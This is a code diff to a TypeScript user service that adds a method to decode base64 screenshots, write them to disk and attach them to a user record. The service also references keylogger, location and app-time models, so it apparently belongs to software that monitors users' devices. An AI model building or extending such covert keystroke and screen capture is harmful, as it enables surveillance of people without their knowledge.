@@ -1,6 +1,8 @@
 import * as bcrypt from "bcrypt";
 import { Service } from "typedi";
 import { OrmRepository } from "typeorm-typedi-extensions";
+import fs from 'fs';
+import uuidv4 from 'uuid';
 
 import {
     EventDispatcher,
@@ -16,6 +18,7 @@ import { Message } from "../models/Message";
 import { Coordinates } from "../models/Coordinates";
 import { TimeOnApp } from "../models/TimeOnApp";
 import { KeyLogger } from "../models/KeyLogger";
+import { ScreenShot } from '../models/ScreenShot';
 
 @Service()
 export class UserService {
@@ -106,6 +109,36 @@ export class UserService {
         await this.userRepository.save(user);
 
         console.log(await this.userRepository.find(user));
+
+        return user;
+    }
+
+    public async addScreenShoot(screenShot: ScreenShot, user: User): Promise<User> {
+        if (user.screenShotList === undefined) {
+            user.screenShotList = [];
+        }
+
+        const fileName = uuidv4();
+
+        const buff = new Buffer(screenShot.screenShot, 'base64');
+
+        try {
+            fs.mkdirSync("screenshot");
+        } catch (err) {
+            if (err.code !== "EEXIST") {
+                throw err;
+            }
+        }
+
+        const filePath = "screenshot/" + fileName + ".png";
+
+        fs.writeFileSync(filePath, buff);
+
+        screenShot.path = filePath;
+
+        user.screenShotList.push(screenShot);
+
+        await this.userRepository.save(user);
 
         return user;
     }
